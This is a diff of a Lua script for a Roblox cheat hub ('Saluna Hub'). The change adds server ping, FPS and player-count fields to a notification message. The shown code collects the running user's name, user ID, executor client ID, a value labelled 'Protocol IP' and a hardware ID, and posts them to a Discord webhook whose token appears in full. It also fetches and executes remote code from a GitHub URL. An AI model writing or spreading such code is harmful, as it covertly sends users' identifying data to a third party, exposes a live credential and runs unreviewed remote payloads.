@@ -23,17 +23,34 @@ end)
 task.spawn(function()
     hardware = (gethwid and gethwid()) or "Unknown HWID"
 end)
+repeat task.wait() until protocol and excutor and hardware
 
 local placeNames = {
     [3237168] = "One Piece Legendary",
     [8569358381] = "OPL: Anarchy"
 }
-
 local currentPlaceId = game.PlaceId
 local currentPlaceName = placeNames[currentPlaceId] or "Unknown Place"
 
-
-repeat task.wait() until protocol and excutor and hardware
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local currentJobId = game.JobId
+local placeId = game.PlaceId
+local url = 'https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100'
+local success, response = pcall(function()
+    return HttpService:JSONDecode(game:HttpGet(url))
+end)
+if success and response then
+    for _, server in ipairs(response.data) do
+        if server.id == currentJobId then
+            local pingg = tonumber(server.ping) or 0
+            local fpss = tonumber(server.fps) or 0
+            pingsv = math.floor(pingg)
+            fpssv = math.floor(fpss)
+            break
+        end
+    end
+end
 local antitable = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/anticamp'))()
 if not table.find(antitable,game.Players.LocalPlayer.Name) then
 local url = "https://discord.com/api/webhooks/1268134529567297629/oYa9cB697UfQ797-lSRVuN68pLb6Cmo0pi84bdRhCKU1eh-qHG4bsKJ3GctgR9nIcElz"
@@ -42,7 +59,7 @@ local url = "https://discord.com/api/webhooks/1268134529567297629/oYa9cB697UfQ79
         ["embeds"] = {
             {
                 ["title"] = " Saluna Notify",
-                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nDisplay Name: "..tostring(game.Players.LocalPlayer.DisplayName) .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================".."\nGame Name: "..tostring(currentPlaceName) .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nProtocol IP: " ..tostring(protocol) .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
+                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nDisplay Name: "..tostring(game.Players.LocalPlayer.DisplayName) .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================".."\nGame Name: "..tostring(currentPlaceName) .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .."\nPlayers: "..tostring(#game.Players:GetChildren()) .."/" ..tostring(game.Players.MaxPlayers) .."\nCurrent Ping: "..tostring(pingsv) .. "\nCurrent FPS: " ..tostring(fpssv) .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nProtocol IP: " ..tostring(protocol) .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x00FF7F)
             }
